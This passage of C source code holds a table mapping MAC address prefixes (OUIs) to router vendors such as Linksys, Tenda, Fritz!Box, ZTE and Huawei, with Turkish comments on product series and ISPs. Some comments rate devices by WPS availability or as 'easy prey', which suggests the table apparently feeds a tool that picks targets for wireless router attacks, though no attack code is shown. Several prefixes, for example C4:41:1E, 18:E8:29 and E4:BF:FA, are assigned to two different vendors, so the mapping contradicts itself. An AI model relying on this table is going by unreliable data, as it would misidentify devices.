  {{0x00,0x21,0x29}, VENDOR_LINKSYS},
  {{0x00,0x22,0x6B}, VENDOR_LINKSYS},
  {{0x00,0x23,0x69}, VENDOR_LINKSYS},
  {{0x00,0x25,0x9C}, VENDOR_LINKSYS},
  {{0x20,0xAA,0x4B}, VENDOR_LINKSYS},
  {{0x58,0x6D,0x8F}, VENDOR_LINKSYS},
  {{0xC0,0xC1,0xC0}, VENDOR_LINKSYS},
  {{0xC4,0x41,0x1E}, VENDOR_LINKSYS},
  {{0x98,0xFC,0x11}, VENDOR_LINKSYS},
  {{0x48,0xF8,0xB3}, VENDOR_LINKSYS},
  {{0x54,0xBE,0xF7}, VENDOR_LINKSYS},
  {{0x60,0x38,0xE0}, VENDOR_LINKSYS},
  {{0xA0,0x21,0xB7}, VENDOR_LINKSYS},

  // ── Belkin (Bütçe router — F7D, F9K, AC serisi) ───────────────────────────
  {{0x00,0x11,0x50}, VENDOR_BELKIN},
  {{0x00,0x17,0x3F}, VENDOR_BELKIN},
  {{0x00,0x1C,0xDF}, VENDOR_BELKIN},
  {{0x00,0x22,0x75}, VENDOR_BELKIN},
  {{0x00,0x26,0xB9}, VENDOR_BELKIN},
  {{0x08,0x86,0x3B}, VENDOR_BELKIN},
  {{0x14,0x91,0x82}, VENDOR_BELKIN},
  {{0x30,0x23,0x03}, VENDOR_BELKIN},
  {{0x44,0xD9,0xE7}, VENDOR_BELKIN},
  {{0x54,0x4A,0x16}, VENDOR_BELKIN},
  {{0x68,0x7F,0x74}, VENDOR_BELKIN},
  {{0x94,0x44,0x52}, VENDOR_BELKIN},
  {{0xB4,0x75,0x0E}, VENDOR_BELKIN},
  {{0xEC,0x1A,0x59}, VENDOR_BELKIN},
  {{0xA0,0xAB,0x1B}, VENDOR_BELKIN},
  {{0xC4,0x41,0x1E}, VENDOR_BELKIN},
  {{0x20,0xAA,0x4B}, VENDOR_BELKIN},

  // ── Tenda (Bütçe/Orta segment — AC, F, N serisi — TR'de çok satılan) ─────
  {{0x00,0x16,0x44}, VENDOR_TENDA},
  {{0x1C,0xAF,0xF7}, VENDOR_TENDA},
  {{0x2C,0xF0,0xEE}, VENDOR_TENDA},
  {{0x4C,0xD1,0x61}, VENDOR_TENDA},
  {{0x80,0xEA,0x07}, VENDOR_TENDA},
  {{0x88,0x5D,0xFB}, VENDOR_TENDA},
  {{0x90,0x56,0x82}, VENDOR_TENDA},
  {{0xA0,0x40,0xE8}, VENDOR_TENDA},
  {{0xB4,0x0F,0x3B}, VENDOR_TENDA},
  {{0xC8,0x3A,0x35}, VENDOR_TENDA},
  {{0xD4,0x76,0xEA}, VENDOR_TENDA},
  {{0x48,0xEE,0x0C}, VENDOR_TENDA},
  {{0x54,0x36,0x9B}, VENDOR_TENDA},
  {{0x58,0x3B,0xD4}, VENDOR_TENDA},
  {{0x6C,0xAB,0x31}, VENDOR_TENDA},
  {{0x8C,0x53,0xC3}, VENDOR_TENDA},
  {{0xE4,0xBF,0xFA}, VENDOR_TENDA},
  {{0xF4,0x3E,0x61}, VENDOR_TENDA},

  // ── Mercusys (TP-Link alt markası — MW, MR serisi — TR'de çok satılan) ────
  {{0x58,0xEF,0x68}, VENDOR_MERCUSYS},
  {{0x64,0x9A,0xBE}, VENDOR_MERCUSYS},
  {{0x78,0xD2,0x94}, VENDOR_MERCUSYS},
  {{0x90,0xDE,0x80}, VENDOR_MERCUSYS},
  {{0xC4,0x9D,0xED}, VENDOR_MERCUSYS},
  {{0xF8,0xE7,0xB3}, VENDOR_MERCUSYS},
  {{0x24,0x0A,0xC4}, VENDOR_MERCUSYS},
  {{0x44,0xA5,0x6E}, VENDOR_MERCUSYS},
  {{0x6C,0x5A,0xB5}, VENDOR_MERCUSYS},
  {{0xA0,0xAF,0xBD}, VENDOR_MERCUSYS},
  {{0xB4,0xA2,0xEB}, VENDOR_MERCUSYS},

  // ── Technicolor / Thomson (ISP OEM — TG784, TG789, DGA4130, DGA4132) ─────
  {{0x00,0x14,0x7F}, VENDOR_TECHNICOLOR},
  {{0x00,0x19,0x15}, VENDOR_TECHNICOLOR},
  {{0x00,0x1A,0xFB}, VENDOR_TECHNICOLOR},
  {{0x00,0x1D,0x19}, VENDOR_TECHNICOLOR},
  {{0x00,0x1E,0xA7}, VENDOR_TECHNICOLOR},
  {{0x00,0x21,0x81}, VENDOR_TECHNICOLOR},
  {{0x00,0x23,0x6C}, VENDOR_TECHNICOLOR},
  {{0x00,0x26,0x44}, VENDOR_TECHNICOLOR},
  {{0x10,0x02,0xB5}, VENDOR_TECHNICOLOR},
  {{0x18,0xE8,0x29}, VENDOR_TECHNICOLOR},
  {{0x30,0x39,0x26}, VENDOR_TECHNICOLOR},
  {{0x30,0x87,0x30}, VENDOR_TECHNICOLOR},
  {{0x3C,0x36,0xE4}, VENDOR_TECHNICOLOR},
  {{0x44,0xD3,0xCA}, VENDOR_TECHNICOLOR},
  {{0x54,0xA0,0x50}, VENDOR_TECHNICOLOR},
  {{0x6C,0xA7,0x5F}, VENDOR_TECHNICOLOR},
  {{0x78,0xA3,0x51}, VENDOR_TECHNICOLOR},
  {{0x7C,0x03,0xD8}, VENDOR_TECHNICOLOR},
  {{0x84,0x9F,0xB5}, VENDOR_TECHNICOLOR},
  {{0x8C,0x10,0xD4}, VENDOR_TECHNICOLOR},
  {{0xA4,0xF4,0xF1}, VENDOR_TECHNICOLOR},
  {{0xB4,0x82,0xFE}, VENDOR_TECHNICOLOR},
  {{0xC4,0x3A,0xBE}, VENDOR_TECHNICOLOR},
  {{0xCC,0x03,0xFA}, VENDOR_TECHNICOLOR},
  {{0xD4,0xD3,0x86}, VENDOR_TECHNICOLOR},
  {{0xE8,0xD0,0x91}, VENDOR_TECHNICOLOR},
  {{0xF4,0x90,0xCB}, VENDOR_TECHNICOLOR},
  {{0xF8,0x7B,0x7A}, VENDOR_TECHNICOLOR},

  // ── AVM Fritz!Box (7490, 7590, 6890, 4060, 5490 serisi) ──────────────────
  {{0x00,0x04,0x0E}, VENDOR_FRITZ},
  {{0x3C,0xA3,0x08}, VENDOR_FRITZ},
  {{0xDC,0x2B,0x61}, VENDOR_FRITZ},
  {{0xA4,0xB1,0xE9}, VENDOR_FRITZ},
  {{0xC8,0x0E,0x14}, VENDOR_FRITZ},
  {{0x2C,0x91,0xAB}, VENDOR_FRITZ},
  {{0x9C,0xC7,0xA6}, VENDOR_FRITZ},
  {{0x18,0x4E,0x16}, VENDOR_FRITZ},
  {{0xF8,0xD0,0x27}, VENDOR_FRITZ},
  {{0x08,0x96,0xD7}, VENDOR_FRITZ},
  {{0xE0,0x28,0x6D}, VENDOR_FRITZ},
  {{0x84,0x3A,0x4B}, VENDOR_FRITZ},
  {{0x38,0x10,0xD5}, VENDOR_FRITZ},
  {{0x74,0x85,0x2A}, VENDOR_FRITZ},
  {{0x00,0x24,0xFE}, VENDOR_FRITZ},
  {{0x1C,0x25,0xE1}, VENDOR_FRITZ},
  {{0x24,0x65,0x11}, VENDOR_FRITZ},
  {{0x34,0x31,0x11}, VENDOR_FRITZ},
  {{0x3C,0x37,0x86}, VENDOR_FRITZ},
  {{0x50,0x4F,0x94}, VENDOR_FRITZ},
  {{0x90,0x18,0x7C}, VENDOR_FRITZ},
  {{0xB8,0x81,0x98}, VENDOR_FRITZ},
  {{0xCC,0x05,0x1B}, VENDOR_FRITZ},
  {{0xE0,0xB9,0xE5}, VENDOR_FRITZ},

  // ── Arris / Motorola (SBG, TG, CM, MG, BGW kablo gateway) ───────────────
  {{0x00,0x06,0x82}, VENDOR_ARRIS},
  {{0x00,0x10,0x18}, VENDOR_ARRIS},
  {{0x00,0x15,0x67}, VENDOR_ARRIS},
  {{0x00,0x17,0xEE}, VENDOR_ARRIS},
  {{0x00,0x19,0xB9}, VENDOR_ARRIS},
  {{0x00,0x1A,0xC2}, VENDOR_ARRIS},
  {{0x00,0x1C,0xC6}, VENDOR_ARRIS},
  {{0x00,0x1D,0xCF}, VENDOR_ARRIS},
  {{0x00,0x1F,0xCF}, VENDOR_ARRIS},
  {{0x00,0x21,0x1D}, VENDOR_ARRIS},
  {{0x00,0x25,0x2E}, VENDOR_ARRIS},
  {{0x00,0x26,0xB8}, VENDOR_ARRIS},
  {{0x04,0x18,0xD6}, VENDOR_ARRIS},
  {{0x44,0xE1,0x37}, VENDOR_ARRIS},
  {{0x48,0x55,0x19}, VENDOR_ARRIS},
  {{0x50,0x8F,0x4C}, VENDOR_ARRIS},
  {{0x84,0x7B,0x57}, VENDOR_ARRIS},
  {{0xAC,0x4B,0xC8}, VENDOR_ARRIS},
  {{0xB8,0xE8,0x6E}, VENDOR_ARRIS},
  {{0xD0,0x5B,0xA8}, VENDOR_ARRIS},
  {{0xE4,0xAB,0x89}, VENDOR_ARRIS},
  {{0x00,0x0C,0xD6}, VENDOR_ARRIS},
  {{0x00,0x1F,0x99}, VENDOR_ARRIS},
  {{0x18,0x68,0x6A}, VENDOR_ARRIS},
  {{0x2C,0x9E,0x5F}, VENDOR_ARRIS},
  {{0x40,0xB8,0x37}, VENDOR_ARRIS},
  {{0x74,0x6F,0x88}, VENDOR_ARRIS},
  {{0x88,0x65,0xED}, VENDOR_ARRIS},
  {{0xA4,0x70,0xD6}, VENDOR_ARRIS},
  {{0xE0,0x18,0x06}, VENDOR_ARRIS},

  // ── Xiaomi / Mi Router (AX, AC, 4A, 4C, R4, RA serisi) ──────────────────
  {{0x28,0x6C,0x07}, VENDOR_XIAOMI},
  {{0x64,0x09,0x80}, VENDOR_XIAOMI},
  {{0x8C,0xBE,0xBE}, VENDOR_XIAOMI},
  {{0xF0,0xB4,0x29}, VENDOR_XIAOMI},
  {{0x50,0x64,0x2B}, VENDOR_XIAOMI},
  {{0xA4,0xC1,0x38}, VENDOR_XIAOMI},
  {{0xB0,0xE2,0x35}, VENDOR_XIAOMI},
  {{0xD4,0xEE,0x07}, VENDOR_XIAOMI},
  {{0x34,0xCE,0x00}, VENDOR_XIAOMI},
  {{0x00,0x9E,0xC8}, VENDOR_XIAOMI},
  {{0x0C,0x1D,0xAF}, VENDOR_XIAOMI},
  {{0x28,0xE3,0x1F}, VENDOR_XIAOMI},
  {{0x54,0x38,0x18}, VENDOR_XIAOMI},
  {{0x68,0xDF,0xDD}, VENDOR_XIAOMI},
  {{0x78,0x11,0xDC}, VENDOR_XIAOMI},
  {{0xAC,0xC1,0xEE}, VENDOR_XIAOMI},
  {{0xC4,0x0B,0xCB}, VENDOR_XIAOMI},
  {{0xFC,0x64,0xBA}, VENDOR_XIAOMI},
  {{0x10,0x2A,0xB3}, VENDOR_XIAOMI},
  {{0x20,0x3A,0x07}, VENDOR_XIAOMI},
  {{0x38,0xA4,0xED}, VENDOR_XIAOMI},
  {{0x58,0x44,0x98}, VENDOR_XIAOMI},
  {{0x7C,0x49,0xEB}, VENDOR_XIAOMI},
  {{0x9C,0x99,0xA0}, VENDOR_XIAOMI},
  {{0xC8,0x47,0x75}, VENDOR_XIAOMI},
  {{0xD4,0x4C,0xE6}, VENDOR_XIAOMI},

  // ── Buffalo (WHR, WSR, WZR, WXR, LS serisi) ──────────────────────────────
  {{0x00,0x16,0x01}, VENDOR_BUFFALO},
  {{0x00,0x24,0xA5}, VENDOR_BUFFALO},
  {{0x10,0x6F,0x3F}, VENDOR_BUFFALO},
  {{0x30,0x85,0xA9}, VENDOR_BUFFALO},
  {{0x3C,0xD9,0x2B}, VENDOR_BUFFALO},
  {{0x48,0x5B,0x39}, VENDOR_BUFFALO},
  {{0x54,0xAF,0x97}, VENDOR_BUFFALO},
  {{0x68,0xBF,0x60}, VENDOR_BUFFALO},
  {{0x98,0x43,0xFA}, VENDOR_BUFFALO},
  {{0xA0,0x8C,0xFD}, VENDOR_BUFFALO},
  {{0xB0,0x4E,0x26}, VENDOR_BUFFALO},
  {{0xC4,0x3D,0xC7}, VENDOR_BUFFALO},
  {{0xDC,0xFB,0x02}, VENDOR_BUFFALO},
  {{0x14,0xFB,0x9F}, VENDOR_BUFFALO},
  {{0x40,0xB0,0x34}, VENDOR_BUFFALO},
  {{0x74,0x03,0xBD}, VENDOR_BUFFALO},
  {{0x90,0x0A,0x27}, VENDOR_BUFFALO},

  // ── MikroTik (hAP, RB, CCR, CRS, Audience serisi) ────────────────────────
  {{0x00,0x0C,0x42}, VENDOR_MIKROTIK},
  {{0x2C,0xC8,0x1B}, VENDOR_MIKROTIK},
  {{0x74,0x4D,0x28}, VENDOR_MIKROTIK},
  {{0xB8,0x69,0xF4}, VENDOR_MIKROTIK},
  {{0xD4,0xCA,0x6D}, VENDOR_MIKROTIK},
  {{0xE4,0x8D,0x8C}, VENDOR_MIKROTIK},
  {{0x4C,0x5E,0x0C}, VENDOR_MIKROTIK},
  {{0x48,0xA9,0x8A}, VENDOR_MIKROTIK},
  {{0x18,0xFD,0x74}, VENDOR_MIKROTIK},
  {{0x6C,0x3B,0x6B}, VENDOR_MIKROTIK},
  {{0x08,0x55,0x31}, VENDOR_MIKROTIK},
  {{0xDC,0x2C,0x6E}, VENDOR_MIKROTIK},
  {{0x60,0x8E,0xC5}, VENDOR_MIKROTIK},
  {{0x8C,0xFD,0xF0}, VENDOR_MIKROTIK},
  {{0xE4,0x2D,0xD6}, VENDOR_MIKROTIK},

  // ── Compal Broadband (CH7465, CH7466, NB250 — ISP OEM) ───────────────────
  {{0x00,0x04,0xED}, VENDOR_COMPAL},
  {{0x00,0x13,0x20}, VENDOR_COMPAL},
  {{0x00,0x1A,0x73}, VENDOR_COMPAL},
  {{0x00,0x22,0x5F}, VENDOR_COMPAL},
  {{0x38,0x60,0x77}, VENDOR_COMPAL},
  {{0x80,0xA1,0xD7}, VENDOR_COMPAL},
  {{0xEC,0x1F,0x72}, VENDOR_COMPAL},
  {{0x28,0xE3,0x47}, VENDOR_COMPAL},
  {{0x48,0x02,0x2A}, VENDOR_COMPAL},
  {{0x68,0xD9,0x3C}, VENDOR_COMPAL},
  {{0x90,0x4E,0x2B}, VENDOR_COMPAL},
  {{0xBC,0x30,0x7E}, VENDOR_COMPAL},

  // ── Sercomm (Vodafone, Turkcell branded ISP modemleri) ───────────────────
  {{0x00,0x0C,0xE7}, VENDOR_SERCOMM},
  {{0x00,0xE0,0xFB}, VENDOR_SERCOMM},
  {{0x00,0x11,0xD9}, VENDOR_SERCOMM},
  {{0x00,0xE0,0x03}, VENDOR_SERCOMM},
  {{0x2C,0x0E,0x3D}, VENDOR_SERCOMM},
  {{0x80,0x2A,0xA8}, VENDOR_SERCOMM},
  {{0xC0,0x3F,0xD5}, VENDOR_SERCOMM},
  {{0xD4,0x21,0x22}, VENDOR_SERCOMM},
  {{0x04,0xB1,0x67}, VENDOR_SERCOMM},
  {{0x34,0x4A,0x9E}, VENDOR_SERCOMM},
  {{0x4C,0x17,0xEB}, VENDOR_SERCOMM},
  {{0x6C,0x8B,0xD3}, VENDOR_SERCOMM},
  {{0x8C,0x68,0xC8}, VENDOR_SERCOMM},
  {{0xA8,0x6B,0x7C}, VENDOR_SERCOMM},
  {{0xC8,0xD7,0x19}, VENDOR_SERCOMM},
  {{0xE8,0x4F,0x25}, VENDOR_SERCOMM},

  // ── Netis / Wavlink (WF, N serisi — bütçe router) ─────────────────────────
  {{0x00,0x23,0x68}, VENDOR_NETIS},
  {{0x10,0xFE,0xED}, VENDOR_NETIS},
  {{0x38,0x3B,0xF6}, VENDOR_NETIS},
  {{0x40,0x8D,0x5C}, VENDOR_NETIS},
  {{0x50,0x2B,0x73}, VENDOR_NETIS},
  {{0x64,0x51,0x7E}, VENDOR_NETIS},
  {{0x88,0xDA,0x1A}, VENDOR_NETIS},
  {{0xA8,0xD8,0x3E}, VENDOR_NETIS},
  {{0xC8,0xD7,0xB3}, VENDOR_NETIS},
  {{0xD8,0x61,0x62}, VENDOR_NETIS},

  // ── Cisco ISP (DPC, EPC, ISB kablo gateway) ───────────────────────────────
  {{0x00,0x01,0x64}, VENDOR_CISCO},
  {{0x00,0x09,0x7C}, VENDOR_CISCO},
  {{0x00,0x0A,0xF3}, VENDOR_CISCO},
  {{0x00,0x0B,0x46}, VENDOR_CISCO},
  {{0x00,0x0D,0xBC}, VENDOR_CISCO},
  {{0x00,0x13,0xC4}, VENDOR_CISCO},
  {{0x00,0x17,0x94}, VENDOR_CISCO},
  {{0x00,0x1A,0xA1}, VENDOR_CISCO},
  {{0x00,0x21,0xBE}, VENDOR_CISCO},
  {{0x00,0x23,0xAC}, VENDOR_CISCO},
  {{0x00,0x25,0x84}, VENDOR_CISCO},
  {{0x00,0x27,0x0D}, VENDOR_CISCO},
  {{0xA8,0xB4,0x56}, VENDOR_CISCO},
  {{0xC0,0x62,0x6B}, VENDOR_CISCO},
  {{0xCC,0xEF,0x48}, VENDOR_CISCO},

  // ── Sagem eski nesil (F@st 1500, 2604, 3504, 3864) ───────────────────────
  {{0x00,0x0E,0x50}, VENDOR_SAGEM},
  {{0x00,0x15,0xAF}, VENDOR_SAGEM},
  {{0x00,0x1D,0x20}, VENDOR_SAGEM},
  {{0x00,0x22,0xED}, VENDOR_SAGEM},
  {{0x10,0x09,0xAD}, VENDOR_SAGEM},
  {{0x1C,0x1B,0x0D}, VENDOR_SAGEM},
  {{0x24,0x7F,0x20}, VENDOR_SAGEM},
  {{0x28,0xA1,0xF0}, VENDOR_SAGEM},
  {{0x30,0x34,0xEB}, VENDOR_SAGEM},
  {{0x4C,0x8B,0x30}, VENDOR_SAGEM},
  {{0x58,0x67,0x1A}, VENDOR_SAGEM},
  {{0x74,0xB5,0x7E}, VENDOR_SAGEM},
  {{0xA4,0xCA,0xA0}, VENDOR_SAGEM},
  {{0xBC,0x76,0x70}, VENDOR_SAGEM},
  {{0xD4,0x3D,0x7E}, VENDOR_SAGEM},

  // ── Comtrend (AR, VR, CT serisi — ISP ADSL/VDSL) ─────────────────────────
  {{0x00,0x12,0xBF}, VENDOR_COMTREND},
  {{0x00,0x1A,0xB6}, VENDOR_COMTREND},
  {{0x1C,0x9E,0x46}, VENDOR_COMTREND},
  {{0x34,0x8A,0x11}, VENDOR_COMTREND},
  {{0x40,0x6B,0xA6}, VENDOR_COMTREND},
  {{0x68,0x8E,0xF4}, VENDOR_COMTREND},
  {{0x88,0xAD,0x43}, VENDOR_COMTREND},
  {{0xC0,0x8A,0xDE}, VENDOR_COMTREND},
  {{0xDC,0xEF,0x09}, VENDOR_COMTREND},

  // ── Actiontec (GT701, MI424WR, C1000A, T3200 — Verizon/CenturyLink) ──────
  {{0x00,0x18,0x01}, VENDOR_ACTIONTEC},
  {{0x00,0x1F,0x90}, VENDOR_ACTIONTEC},
  {{0x00,0x24,0x7B}, VENDOR_ACTIONTEC},
  {{0x00,0x26,0x50}, VENDOR_ACTIONTEC},
  {{0x10,0x7B,0x44}, VENDOR_ACTIONTEC},
  {{0x1C,0x1B,0xB5}, VENDOR_ACTIONTEC},
  {{0x20,0x0C,0xC8}, VENDOR_ACTIONTEC},
  {{0x44,0x32,0xC8}, VENDOR_ACTIONTEC},
  {{0x68,0x1C,0xA2}, VENDOR_ACTIONTEC},
  {{0x7C,0x69,0x79}, VENDOR_ACTIONTEC},
  {{0x80,0xD0,0x5A}, VENDOR_ACTIONTEC},
  {{0xA0,0x1C,0x8D}, VENDOR_ACTIONTEC},
  {{0xEC,0x44,0x76}, VENDOR_ACTIONTEC},

  // ── Gemtek (ISP OEM — Turkcell, TTNet branded) ────────────────────────────
  {{0x00,0x1E,0x10}, VENDOR_GEMTEK},
  {{0x00,0x22,0x07}, VENDOR_GEMTEK},
  {{0x00,0x26,0x89}, VENDOR_GEMTEK},
  {{0x18,0x3D,0xA2}, VENDOR_GEMTEK},
  {{0x34,0xC0,0x59}, VENDOR_GEMTEK},
  {{0x40,0xF2,0x01}, VENDOR_GEMTEK},
  {{0x4C,0xFD,0x6F}, VENDOR_GEMTEK},
  {{0x58,0x98,0x35}, VENDOR_GEMTEK},
  {{0x6C,0x7E,0x67}, VENDOR_GEMTEK},
  {{0x8C,0xAB,0x8E}, VENDOR_GEMTEK},
  {{0xA8,0x6C,0xF6}, VENDOR_GEMTEK},
  {{0xCC,0xB9,0xE8}, VENDOR_GEMTEK},
  {{0xE4,0x57,0x40}, VENDOR_GEMTEK},

  // ── Iskratel (Si2000, Innbox — Türkiye/Balkan ISP) ────────────────────────
  {{0x00,0x0A,0xD2}, VENDOR_ISKRATEL},
  {{0x00,0x17,0x42}, VENDOR_ISKRATEL},
  {{0x00,0x20,0xB5}, VENDOR_ISKRATEL},
  {{0x10,0x1F,0x74}, VENDOR_ISKRATEL},
  {{0x20,0x89,0x86}, VENDOR_ISKRATEL},
  {{0x2C,0xC5,0x4A}, VENDOR_ISKRATEL},
  {{0x40,0xC7,0x29}, VENDOR_ISKRATEL},
  {{0x58,0xD9,0xD5}, VENDOR_ISKRATEL},
  {{0x68,0xA7,0xC4}, VENDOR_ISKRATEL},
  {{0x7C,0x38,0x66}, VENDOR_ISKRATEL},
  {{0x94,0x10,0x3E}, VENDOR_ISKRATEL},
  {{0xA8,0xBB,0x50}, VENDOR_ISKRATEL},
  {{0xC0,0xBC,0x9A}, VENDOR_ISKRATEL},

  // ── Totolink / Zio Technologies (Realtek chipset — kolay lokma) ───────────
  {{0x00,0x13,0x3B}, VENDOR_TOTOLINK},
  {{0x14,0xDD,0xA9}, VENDOR_TOTOLINK},
  {{0x28,0x87,0xBF}, VENDOR_TOTOLINK},
  {{0x2C,0x6E,0x85}, VENDOR_TOTOLINK},
  {{0x38,0x7B,0x40}, VENDOR_TOTOLINK},
  {{0x40,0x4D,0x8E}, VENDOR_TOTOLINK},
  {{0x48,0xEE,0x0D}, VENDOR_TOTOLINK},
  {{0x5C,0xDD,0x70}, VENDOR_TOTOLINK},
  {{0x7C,0xB5,0x9B}, VENDOR_TOTOLINK},
  {{0x94,0x0C,0x98}, VENDOR_TOTOLINK},
  {{0xA4,0x3B,0xFA}, VENDOR_TOTOLINK},
  {{0xBC,0x46,0x99}, VENDOR_TOTOLINK},
  {{0xC8,0x07,0x6E}, VENDOR_TOTOLINK},
  {{0xD8,0x38,0xFC}, VENDOR_TOTOLINK},
  {{0xEC,0x43,0xE6}, VENDOR_TOTOLINK},
  {{0xF4,0xD1,0x08}, VENDOR_TOTOLINK},

  // ── DrayTek (Vigor serisi — SOHO/ISP, bazı TR ISP) ────────────────────────
  {{0x00,0x1D,0xAA}, VENDOR_DRAYTEK},
  {{0x00,0x50,0x7F}, VENDOR_DRAYTEK},
  {{0x14,0x49,0x58}, VENDOR_DRAYTEK},
  {{0x20,0x4E,0x77}, VENDOR_DRAYTEK},
  {{0x28,0xC6,0x71}, VENDOR_DRAYTEK},
  {{0x40,0x16,0x37}, VENDOR_DRAYTEK},
  {{0x5C,0x26,0x0A}, VENDOR_DRAYTEK},
  {{0x74,0xDA,0xDA}, VENDOR_DRAYTEK},
  {{0x90,0x1A,0x4A}, VENDOR_DRAYTEK},
  {{0xAC,0x15,0xA2}, VENDOR_DRAYTEK},
  {{0xD8,0x6C,0xE9}, VENDOR_DRAYTEK},
  {{0xF0,0x23,0xB9}, VENDOR_DRAYTEK},

  // ── Billion Electric (BiPAC — ISP OEM, bazı bölgeler) ────────────────────
  {{0x00,0x0E,0x91}, VENDOR_BILLION},
  {{0x00,0x90,0x4C}, VENDOR_BILLION},
  {{0x18,0xC0,0x4D}, VENDOR_BILLION},
  {{0x34,0x6A,0xB5}, VENDOR_BILLION},
  {{0x50,0x75,0xD6}, VENDOR_BILLION},
  {{0x8C,0xAE,0x4C}, VENDOR_BILLION},
  {{0xA4,0xC0,0xE1}, VENDOR_BILLION},
  {{0xC0,0x25,0x06}, VENDOR_BILLION},
  {{0xD4,0x6E,0xEA}, VENDOR_BILLION},
  {{0xEC,0x1E,0xA4}, VENDOR_BILLION},

  // ── NetComm Wireless (NF/NL/NTC serisi — Avustralya ISP OEM) ─────────────
  {{0x00,0x01,0xB4}, VENDOR_NETCOMM},
  {{0x00,0x15,0x2A}, VENDOR_NETCOMM},
  {{0x00,0x1E,0x9B}, VENDOR_NETCOMM},
  {{0x00,0x26,0x2D}, VENDOR_NETCOMM},
  {{0x2C,0x41,0x38}, VENDOR_NETCOMM},
  {{0x44,0xFE,0x3B}, VENDOR_NETCOMM},
  {{0x74,0x03,0xBD}, VENDOR_NETCOMM},
  {{0xB4,0x82,0xFE}, VENDOR_NETCOMM},

  // ── Ubiquiti Networks (UniFi/airOS — nadiren WPS'li) ─────────────────────
  {{0x00,0x27,0x22}, VENDOR_UBIQUITI},
  {{0x04,0x18,0xD6}, VENDOR_UBIQUITI},
  {{0x0A,0x18,0xD6}, VENDOR_UBIQUITI},
  {{0x18,0xE8,0x29}, VENDOR_UBIQUITI},
  {{0x24,0xA4,0x3C}, VENDOR_UBIQUITI},
  {{0x44,0xD9,0xE7}, VENDOR_UBIQUITI},
  {{0x68,0x72,0x51}, VENDOR_UBIQUITI},
  {{0x74,0x83,0xC8}, VENDOR_UBIQUITI},
  {{0x78,0x8A,0x20}, VENDOR_UBIQUITI},
  {{0x80,0x2A,0xA8}, VENDOR_UBIQUITI},
  {{0xB4,0xFB,0xE4}, VENDOR_UBIQUITI},
  {{0xDC,0x9F,0xDB}, VENDOR_UBIQUITI},
  {{0xE0,0x63,0xDA}, VENDOR_UBIQUITI},
  {{0xF0,0x9F,0xC2}, VENDOR_UBIQUITI},
  {{0xFC,0xEC,0xDA}, VENDOR_UBIQUITI},

  // ── Ek ZTE OUI'leri (sık görülen ama listede olmayan) ────────────────────
  {{0x00,0xF8,0x7C}, VENDOR_ZTE},
  {{0x0C,0x8C,0x24}, VENDOR_ZTE},
  {{0x18,0xA5,0x87}, VENDOR_ZTE},
  {{0x24,0x16,0x6F}, VENDOR_ZTE},
  {{0x30,0x22,0x5A}, VENDOR_ZTE},
  {{0x38,0x21,0x65}, VENDOR_ZTE},
  {{0x44,0xA8,0x42}, VENDOR_ZTE},
  {{0x60,0x42,0x14}, VENDOR_ZTE},
  {{0x68,0x7F,0xB0}, VENDOR_ZTE},
  {{0x70,0xB3,0xD5}, VENDOR_ZTE},
  {{0x78,0x44,0x4F}, VENDOR_ZTE},
  {{0x80,0x19,0x3A}, VENDOR_ZTE},
  {{0x84,0x74,0x60}, VENDOR_ZTE},
  {{0x90,0x81,0x5F}, VENDOR_ZTE},
  {{0x9C,0x07,0x71}, VENDOR_ZTE},
  {{0xA0,0x8C,0x15}, VENDOR_ZTE},
  {{0xA8,0xB7,0x4F}, VENDOR_ZTE},
  {{0xB0,0xEC,0x9E}, VENDOR_ZTE},
  {{0xB4,0x24,0xC7}, VENDOR_ZTE},
  {{0xBC,0xA5,0x11}, VENDOR_ZTE},
  {{0xC0,0x50,0x9B}, VENDOR_ZTE},
  {{0xC4,0x86,0xE9}, VENDOR_ZTE},
  {{0xC8,0x64,0x4D}, VENDOR_ZTE},
  {{0xD0,0x3C,0x24}, VENDOR_ZTE},
  {{0xD8,0x5D,0x4C}, VENDOR_ZTE},
  {{0xE0,0x1C,0x41}, VENDOR_ZTE},
  {{0xE4,0xBF,0xFA}, VENDOR_ZTE},
  {{0xF0,0xEB,0xD0}, VENDOR_ZTE},
  {{0xF4,0x0F,0x24}, VENDOR_ZTE},
  {{0x5C,0x5E,0xE8}, VENDOR_ZTE},
  {{0x6C,0x59,0x40}, VENDOR_ZTE},
  {{0x7C,0xB7,0x33}, VENDOR_ZTE},
  {{0x8C,0x2D,0xAA}, VENDOR_ZTE},
  {{0x3C,0xA8,0x2A}, VENDOR_ZTE},
  {{0x4C,0xB1,0x99}, VENDOR_ZTE},
  {{0x54,0x43,0x4F}, VENDOR_ZTE},

  // ── Ek Huawei OUI'leri ────────────────────────────────────────────────────
  {{0x00,0x1E,0x67}, VENDOR_HUAWEI},
  {{0x04,0xF9,0x38}, VENDOR_HUAWEI},
  {{0x0C,0x37,0xDC}, VENDOR_HUAWEI},
  {{0x14,0xB9,0x68}, VENDOR_HUAWEI},
  {{0x18,0x66,0xDA}, VENDOR_HUAWEI},
  {{0x1C,0x52,0x16}, VENDOR_HUAWEI},
  {{0x20,0xF1,0x7C}, VENDOR_HUAWEI},
  {{0x24,0x4C,0x07}, VENDOR_HUAWEI},
  {{0x28,0x6E,0xD4}, VENDOR_HUAWEI},
  {{0x2C,0xAB,0x00}, VENDOR_HUAWEI},
  {{0x38,0x5A,0xC4}, VENDOR_HUAWEI},
  {{0x3C,0xFA,0x43}, VENDOR_HUAWEI},
  {{0x44,0x55,0xB1}, VENDOR_HUAWEI},
  {{0x48,0x57,0x02}, VENDOR_HUAWEI},
  {{0x4C,0x6B,0xE8}, VENDOR_HUAWEI},
  {{0x50,0x01,0xD8}, VENDOR_HUAWEI},
  {{0x5C,0x4C,0xA9}, VENDOR_HUAWEI},
  {{0x60,0xE7,0x01}, VENDOR_HUAWEI},
  {{0x64,0x3E,0x8C}, VENDOR_HUAWEI},
  {{0x68,0xCC,0x6E}, VENDOR_HUAWEI},
  {{0x6C,0x4B,0x90}, VENDOR_HUAWEI},
  {{0x70,0xCD,0x0D}, VENDOR_HUAWEI},
  {{0x78,0x88,0x6D}, VENDOR_HUAWEI},
  {{0x7C,0x05,0x07}, VENDOR_HUAWEI},
  {{0x80,0x18,0x44}, VENDOR_HUAWEI},
  {{0x84,0xBF,0x46}, VENDOR_HUAWEI},
  {{0x88,0xA2,0xD7}, VENDOR_HUAWEI},
  {{0x8C,0x0E,0xE3}, VENDOR_HUAWEI},
  {{0x90,0x67,0x1C}, VENDOR_HUAWEI},
  {{0x94,0x04,0x9C}, VENDOR_HUAWEI},
  {{0x98,0xE7,0xF4}, VENDOR_HUAWEI},
  {{0x9C,0x28,0xEF}, VENDOR_HUAWEI},
